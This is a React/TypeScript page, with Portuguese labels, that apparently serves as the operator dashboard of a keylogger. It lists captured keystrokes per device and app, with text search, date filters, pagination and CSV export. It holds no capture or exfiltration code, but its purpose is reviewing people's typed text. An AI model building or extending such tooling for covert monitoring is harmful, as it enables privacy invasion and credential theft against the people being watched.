import { useState, useMemo } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { Download, Search, Filter, X, Loader2 } from "lucide-react";
import { trpc } from "@/lib/trpc";

interface Keylog {
  id: number;
  deviceId: string;
  appName: string;
  keyText: string;
  createdAt: Date;
}

export default function Keylogs() {
  const [searchText, setSearchText] = useState("");
  const [selectedApp, setSelectedApp] = useState<string | null>(null);
  const [startDate, setStartDate] = useState("");
  const [endDate, setEndDate] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [selectedDeviceId, setSelectedDeviceId] = useState("1");
  const itemsPerPage = 20;

  // Buscar keylogs do backend
  const { data: keylogs = [], isLoading, error } = trpc.keylogs.list.useQuery({
    deviceId: selectedDeviceId,
  }) as any;

  // Extrair apps únicos
  const uniqueApps = useMemo(
    () => Array.from(new Set(keylogs.map((log: any) => log.appName))) as string[],
    [keylogs]
  );

  // Filtrar keylogs
  const filteredKeylogs = useMemo(() => {
    return keylogs.filter((log: any) => {
      // Filtro por texto
      if (
        searchText &&
        !log.keyText.toLowerCase().includes(searchText.toLowerCase())
      ) {
        return false;
      }

      // Filtro por app
      if (selectedApp && log.appName !== selectedApp) {
        return false;
      }

      // Filtro por data
      if (startDate) {
        const logDate = new Date(log.createdAt).toISOString().split("T")[0];
        if (logDate < startDate) return false;
      }

      if (endDate) {
        const logDate = new Date(log.createdAt).toISOString().split("T")[0];
        if (logDate > endDate) return false;
      }

      return true;
    });
  }, [keylogs, searchText, selectedApp, startDate, endDate]);

  // Paginação
  const totalPages = Math.ceil(filteredKeylogs.length / itemsPerPage);
  const paginatedKeylogs = filteredKeylogs.slice(
    (currentPage - 1) * itemsPerPage,
    currentPage * itemsPerPage
  );

  // Exportar para CSV
  const handleExportCSV = () => {
    const csv = [
      ["Data", "App", "Texto"],
      ...filteredKeylogs.map((log: any) => [
        new Date(log.createdAt).toLocaleString("pt-BR"),
        log.appName,
        log.keyText,
      ]),
    ]
      .map((row: any) => row.map((cell: any) => `"${cell}"`).join(","))
      .join("\n");

    const blob = new Blob([csv], { type: "text/csv" });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `keylogs-${new Date().toISOString().split("T")[0]}.csv`;
    a.click();
  };

  // Limpar filtros
  const handleClearFilters = () => {
    setSearchText("");
    setSelectedApp(null);
    setStartDate("");
    setEndDate("");
    setCurrentPage(1);
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold text-white">⌨️ Keylogs</h1>
          <p className="text-slate-400 mt-2">
            Total: {isLoading ? "Carregando..." : String(filteredKeylogs.length)} registros
          </p>
        </div>
        <Button
          onClick={handleExportCSV}
          disabled={filteredKeylogs.length === 0 || isLoading}
          className="bg-cyan-600 hover:bg-cyan-700 text-white"
        >
          <Download className="w-4 h-4 mr-2" />
          Exportar CSV
        </Button>
      </div>

      {/* Seletor de Dispositivo */}
      <Card className="bg-slate-800 border-slate-700 p-4">
        <label className="text-sm text-slate-400 mb-2 block">
          Selecionar Dispositivo
        </label>
        <select
          value={selectedDeviceId}
          onChange={(e) => {
            setSelectedDeviceId(e.target.value);
            setCurrentPage(1);
          }}
          className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2 placeholder:text-slate-500"
        >
          <option value="1">Dispositivo 1</option>
          <option value="2">Dispositivo 2</option>
          <option value="3">Dispositivo 3</option>
        </select>
      </Card>

      {/* Filtros */}
      <Card className="bg-slate-800 border-slate-700 p-6">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-cyan-400 font-bold flex items-center gap-2">
            <Filter className="w-5 h-5" />
            Filtros
          </h2>
          {(searchText ||
            selectedApp ||
            startDate ||
            endDate) && (
            <Button
              onClick={handleClearFilters}
              variant="outline"
              size="sm"
              className="text-slate-400 hover:text-white"
            >
              <X className="w-4 h-4 mr-1" />
              Limpar
            </Button>
          )}
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
          {/* Busca por texto */}
          <div>
            <label className="text-sm text-slate-400 mb-2 block">
              Buscar Texto
            </label>
            <div className="relative">
              <Search className="absolute left-3 top-3 w-4 h-4 text-slate-500" />
              <Input
                type="text"
                placeholder="Digite o texto..."
                value={searchText}
                onChange={(e) => {
                  setSearchText(e.target.value);
                  setCurrentPage(1);
                }}
                className="bg-slate-700 border-slate-600 text-white pl-10 placeholder:text-slate-500"
              />
            </div>
          </div>

          {/* Filtro por app */}
          <div>
            <label className="text-sm text-slate-400 mb-2 block">App</label>
            <select
              value={selectedApp || ""}
              onChange={(e) => {
                setSelectedApp(e.target.value || null);
                setCurrentPage(1);
              }}
              className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2 placeholder:text-slate-500"
            >
              <option value="">Todos os apps</option>
              {uniqueApps.map((app: string) => (
                <option key={app} value={app}>
                  {app as React.ReactNode}
                </option>
              ))}
            </select>
          </div>

          {/* Data inicial */}
          <div>
            <label className="text-sm text-slate-400 mb-2 block">
              Data Inicial
            </label>
            <Input
              type="date"
              value={startDate}
              onChange={(e) => {
                setStartDate(e.target.value);
                setCurrentPage(1);
              }}
              className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-500"
            />
          </div>

          {/* Data final */}
          <div>
            <label className="text-sm text-slate-400 mb-2 block">
              Data Final
            </label>
            <Input
              type="date"
              value={endDate}
              onChange={(e) => {
                setEndDate(e.target.value);
                setCurrentPage(1);
              }}
              className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-500"
            />
          </div>
        </div>
      </Card>

      {/* Lista de Keylogs */}
      <Card className="bg-slate-800 border-slate-700 p-6">
        {isLoading ? (
          <div className="flex items-center justify-center py-8">
            <Loader2 className="w-6 h-6 text-cyan-400 animate-spin mr-2" />
            <span className="text-slate-400">Carregando keylogs...</span>
          </div>
        ) : error && (error as any)?.message ? (
          <p className="text-red-400 text-center py-8">
            Erro ao carregar keylogs: {(error as any).message}
          </p>
        ) : paginatedKeylogs.length === 0 ? (
          <p className="text-slate-400 text-center py-8">
            Nenhum keylog encontrado com os filtros aplicados
          </p>
        ) : (
          <>
            <div className="space-y-2">
              {paginatedKeylogs.map((log: Keylog) => (
                <div
                  key={log.id}
                  className="flex items-start gap-4 p-4 bg-slate-700 rounded border border-slate-600 hover:border-cyan-500 transition"
                >
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-2">
                      <span className="px-2 py-1 bg-cyan-600 text-white text-xs rounded font-bold">
                        {log.appName}
                      </span>
                      <span className="text-slate-500 text-xs">
                        {new Date(log.createdAt).toLocaleString("pt-BR")}
                      </span>
                    </div>
                    <p className="text-slate-300 break-words">{log.keyText}</p>
                  </div>
                </div>
              ))}
            </div>

            {/* Paginação */}
            {totalPages > 1 && (
              <div className="flex items-center justify-center gap-2 mt-6">
                <Button
                  onClick={() => setCurrentPage(Math.max(1, currentPage - 1))}
                  disabled={currentPage === 1}
                  variant="outline"
                  size="sm"
                >
                  ← Anterior
                </Button>

                <div className="flex items-center gap-1">
                  {Array.from({ length: totalPages }).map((_, i) => (
                    <Button
                      key={i + 1}
                      onClick={() => setCurrentPage(i + 1)}
                      variant={currentPage === i + 1 ? "default" : "outline"}
                      size="sm"
                      className={
                        currentPage === i + 1
                          ? "bg-cyan-600 hover:bg-cyan-700"
                          : ""
                      }
                    >
                      {i + 1}
                    </Button>
                  ))}
                </div>

                <Button
                  onClick={() =>
                    setCurrentPage(Math.min(totalPages, currentPage + 1))
                  }
                  disabled={currentPage === totalPages}
                  variant="outline"
                  size="sm"
                >
                  Próxima →
                </Button>
              </div>
            )}
          </>
        )}
      </Card>
    </div>
  );
}
